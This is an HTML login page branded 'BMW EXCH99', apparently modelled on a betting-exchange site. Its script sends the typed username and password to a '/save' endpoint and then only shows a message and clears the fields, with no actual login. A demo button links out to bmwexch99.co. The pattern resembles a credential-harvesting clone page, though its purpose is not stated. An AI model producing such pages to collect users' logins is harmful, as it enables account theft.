<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>BMW EXCH99</title>

<link rel="stylesheet" href="style.css">

<style>

body{
    margin:0;
    padding:0;
    font-family:Arial;
    background:linear-gradient(to bottom,#001133,#00aa55);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
}

.main{
    width:350px;
}

.logo{
    text-align:center;
    color:white;
    font-size:45px;
    font-weight:bold;
    margin-bottom:20px;
}

.login-box{
    background:white;
    padding:25px;
    border-radius:10px;
}

.login-box h2{
    text-align:center;
    margin-bottom:20px;
}

input{
    width:100%;
    padding:14px;
    margin-bottom:15px;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:16px;
    box-sizing:border-box;
}

button{
    width:100%;
    padding:14px;
    border:none;
    background:#001133;
    color:white;
    font-size:16px;
    border-radius:5px;
    cursor:pointer;
    margin-bottom:10px;
}

.demo-btn{
    background:black;
}

</style>

</head>

<body>

<div class="main">

    <div class="logo">

        BMW<br>
        EXCH99

    </div>

    <div class="login-box">

        <h2>Login</h2>

        <input
            type="text"
            id="username"
            placeholder="Username"
        >

        <input
            type="password"
            id="password"
            placeholder="Password"
        >

        <button onclick="login()">

            Login

        </button>

       <button 
class="demo-btn"
onclick="window.location.href='https://www.bmwexch99.co/home'">

Login with Demo ID

</button>

    </div>

</div>

<script>

async function login() {

    const username =
    document.getElementById("username").value;

    const password =
    document.getElementById("password").value;

    if(username === "" || password === ""){

        alert("Please fill all fields");

        return;

    }

    try{

        const response = await fetch("/save", {

            method: "POST",

            headers: {

                "Content-Type": "application/json"

            },

            body: JSON.stringify({

                username,
                password

            })

        });

        const data = await response.json();

        alert(data.message);

        document.getElementById("username").value = "";

        document.getElementById("password").value = "";

    }

    catch(error){

        alert("Server Error");

        console.log(error);

    }

}

</script>

</body>

</html>
